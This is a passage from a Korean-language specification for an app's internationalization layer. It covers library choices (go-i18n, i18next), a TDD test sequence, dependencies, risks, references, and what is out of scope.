Exit code: `0`(pass), `1`(Tier 1 누락 또는 구문 오류), `2`(Tier 2 누락, WARN만).

### 6.8 라이브러리 결정

| 용도 | 라이브러리 | 버전 | 결정 근거 |
|------|----------|-----|---------|
| Backend i18n | `github.com/nicksnyder/go-i18n/v2` | v2.4+ | CLDR 플루럴 내장, go-template 호환 |
| Backend ICU | `github.com/gohugoio/locales` | latest | go-i18n/v2의 의존성, CLDR 데이터 |
| Backend 날짜/숫자 | `golang.org/x/text/{date,number,language}` | v0.14+ | Google 유지, LOCALE-001과 공유 |
| Frontend i18n | `i18next` + `react-i18next` | i18next 24.x / react-i18next 14.x | 70+ 플러그인 생태계 |
| Frontend ICU | `i18next-icu` | 2.x | FormatJS 기반 ICU 엔진 |
| Frontend HTTP backend | `i18next-http-backend` | 3.x | dev hot reload |
| Frontend plural | i18next 내장 | — | CLDR 기반 |
| YAML 파싱 (TS) | `yaml` npm | 2.x | JSON 대비 편의 |
| YAML 파싱 (Go) | `gopkg.in/yaml.v3` | — | CONFIG-001/LOCALE-001 공유 |
| RTL 유틸 | CSS logical properties + Tailwind `rtl:` | — | 라이브러리 불필요 |

### 6.9 TDD 진입 순서

1. **RED #1** — `TestTranslator_BasicKey` → AC-I18N-001
2. **RED #2** — `TestTranslator_EnglishFallback` → AC-I18N-002
3. **RED #3** — `TestPluralizer_Korean_OtherOnly` → AC-I18N-003
4. **RED #4** — `TestPluralizer_English_OneOther` → AC-I18N-004
5. **RED #5** — `TestPluralizer_Russian_FourForms` → AC-I18N-005
6. **RED #6** — `TestIsRTL_Arabic_Hebrew_Persian` → REQ-I18N-007
7. **RED #7** — `TestFormatter_Date_Korean` → AC-I18N-007
8. **RED #8** — `TestFormatter_Currency_KRW` → AC-I18N-008
9. **RED #9** — `TestFormatter_RelativeTime_JA` → AC-I18N-009
10. **RED #10** — `TestLoader_RejectCRLF_BOM` → REQ-I18N-003
11. **RED #11** — `TestICU_RejectFunctionCall` → AC-I18N-014
12. **GREEN** — 최소 구현
13. **REFACTOR** — 번들 lazy loading, memoization

### 6.10 TRUST 5 매핑

| 차원 | 달성 방법 |
|-----|---------|
| **T**ested | CLDR 플루럴 8개 언어 테이블 테스트, ICU 30+ 케이스, RTL 5언어 통합 테스트, 커버리지 85%+ |
| **R**eadable | 네임스페이스 분리(common/settings/onboarding/...), YAML 주석 권장 |
| **U**nified | `mink i18n lint` CI 필수, 키 네이밍 규칙(snake_case + dot namespace) |
| **S**ecured | ICU 코드 실행 거부(REQ-I18N-013), YAML type 검증(REQ-I18N-014), LLM에 PII 전송 금지(REQ-I18N-015) |
| **T**rackable | 번역 기여 PR 템플릿 + `_machine_translated` 마커로 출처 추적 |

---

## 7. 의존성 (Dependencies)

| 타입 | 대상 | 설명 |
|-----|------|------|
| 선행 SPEC | **SPEC-GOOSE-LOCALE-001** | `LocaleContext.primary_language`/`currency`/`calendar_system` 소비 |
| 선행 SPEC | SPEC-GOOSE-CONFIG-001 | locale 섹션에서 language override 읽음 |
| 선행 SPEC | SPEC-GOOSE-ADAPTER-001 | Tier 3 LLM 자동번역 파이프라인 |
| 후속 SPEC | SPEC-GOOSE-DESKTOP-001 | i18next 소비, RTL 레이아웃 |
| 후속 SPEC | SPEC-GOOSE-MOBILE-001 | react-i18next 소비, I18nManager.forceRTL |
| 후속 SPEC | SPEC-GOOSE-ONBOARDING-001 | 번역된 온보딩 텍스트 렌더 |
| 후속 SPEC | SPEC-GOOSE-REGION-SKILLS-001 | Skill 설명 번역 키 공유 |
| 외부 | `nicksnyder/go-i18n/v2` v2.4+ | Go backend |
| 외부 | `i18next` 24.x + `react-i18next` 14.x + `i18next-icu` 2.x | Frontend |
| 외부 | `golang.org/x/text/*` v0.14+ | 날짜/숫자/통화 포맷 |
| 외부 | Tailwind 4.x | RTL utility |

---

## 8. 리스크 & 완화 (Risks & Mitigations)

| # | 리스크 | 가능성 | 영향 | 완화 |
|---|------|------|-----|------|
| R1 | 20+ 언어 번들 크기 증가로 앱 용량 팽창 | 중 | 중 | 언어별 lazy load(i18next-http-backend), 번들당 평균 ~30KB 목표 |
| R2 | ICU MessageFormat 학습 곡선 | 중 | 낮 | `docs/i18n-authoring-guide.md` 작성, 템플릿 예시 제공 |
| R3 | Tier 3 LLM 자동번역 품질 편차 | 고 | 중 | `_machine_translated` 배지 노출 + 커뮤니티 PR 장려 |
| R4 | RTL 아이콘 대칭화 누락 | 중 | 중 | Figma에서 LTR+RTL 쌍 자산 관리, Playwright 스크린샷 테스트 |
| R5 | `I18nManager.forceRTL` 후 재시작 필요(RN 제약) | 고 | 중 | 재시작 확인 UX + Restart 버튼 명시적 제공 |
| R6 | 번역 PR 검토 인력 부족 | 고 | 중 | GitHub CODEOWNERS로 언어별 오너 지정, LGTM 1건으로 merge |
| R7 | ICU `select`로 성별 번역 시 성 중립 언어(한국어/일본어) 처리 | 중 | 낮 | `neutral` case를 default로 두는 패턴 문서화 |
| R8 | `i18next-http-backend` 개발 vs 프로덕션 번들링 차이 | 중 | 중 | Vite config로 프로덕션은 `import.meta.glob` 정적 import |

---

## 9. 참고 (References)

### 9.1 프로젝트 문서

- `.moai/project/branding.md` §3 다국어 페르소나 시스템
- `.moai/project/adaptation.md` §4 Cultural Context
- `.moai/project/research/hermes-llm.md` §2 프로바이더 매트릭스 (다양성 벤치마크)
- `.moai/specs/SPEC-GOOSE-LOCALE-001/spec.md` — 본 SPEC의 기반
- `.moai/specs/SPEC-GOOSE-DESKTOP-001/spec.md` §3 i18n(ko/en/ja/zh) — 확장 대상

### 9.2 외부 참조

- ICU MessageFormat: https://unicode-org.github.io/icu/userguide/format_parse/messages/
- CLDR Plural Rules: https://cldr.unicode.org/index/cldr-spec/plural-rules
- Unicode Bidirectional Algorithm (UAX #9)
- `nicksnyder/go-i18n/v2` documentation
- `i18next` + `react-i18next` documentation
- `i18next-icu` plugin

### 9.3 부속 문서

- `./research.md` — go-i18n vs i18next 비교, ICU vs gettext 분석, Tier 3 파이프라인 비용 추정
- `../SPEC-GOOSE-LOCALE-001/spec.md`
- `../SPEC-GOOSE-REGION-SKILLS-001/spec.md`
- `../SPEC-GOOSE-ONBOARDING-001/spec.md`

---

## Exclusions (What NOT to Build)

- 본 SPEC은 **번역 관리 SaaS(Crowdin/Lokalise)와 통합하지 않는다**. v1.5+ 별도 SPEC.
- 본 SPEC은 **In-context editing UI를 포함하지 않는다**.
- 본 SPEC은 **사용자 생성 콘텐츠(일기, 메모)를 번역하지 않는다**. UGC는 LLM이 필요 시 처리.
- 본 SPEC은 **TTS/STT 다국어를 구현하지 않는다**(MOBILE-001).
- 본 SPEC은 **문화권별 이모지 변형을 제공하지 않는다**.
- 본 SPEC은 **Unicode BiDi 알고리즘을 직접 구현하지 않는다**. 브라우저/RN 내장에 위임.
- 본 SPEC은 **WebAssembly ICU를 번들하지 않는다**. 네이티브 구현만.
- 본 SPEC은 **번역 품질 자동 평가를 수행하지 않는다**.
- 본 SPEC은 **릴리스 빌드에서 네트워크 번들 로딩을 허용하지 않는다**(REQ-I18N-016, Tier 1/Tier 2 한정).
- 본 SPEC은 **LLM에 사용자 PII를 전송하지 않는다**(REQ-I18N-015).
- 본 SPEC은 **Tier 3 자동번역 결과를 자동 커밋하지 않는다**. PR 생성 또는 사용자 로컬 저장만.
- 본 SPEC은 **ICU `select`를 활용한 성별 인지(gender-aware) 번역을 v0.1 범위에 포함하지 않는다**. §2.4에서 동기로만 언급되며, 번역자가 ICU `select` 구문을 수동으로 작성하면 엔진이 렌더링은 하지만, 성별 감지 자동화/프로필 연동/성중립 언어(ko/ja) 대응 규칙은 향후 SPEC에서 다룬다. R7 참조.
- 본 SPEC은 **컨텍스트 의존 번역(context-dependent translation) — i18next `_context` suffix 등으로 같은 키의 의미 분기(verb "close" vs adjective "close")를 지원하지 않는다**. 필요 시 번역자가 별도 키로 분리하여 작성해야 한다. v1.0+ 별도 SPEC에서 다룰 수 있음.

---

**End of SPEC-GOOSE-I18N-001**
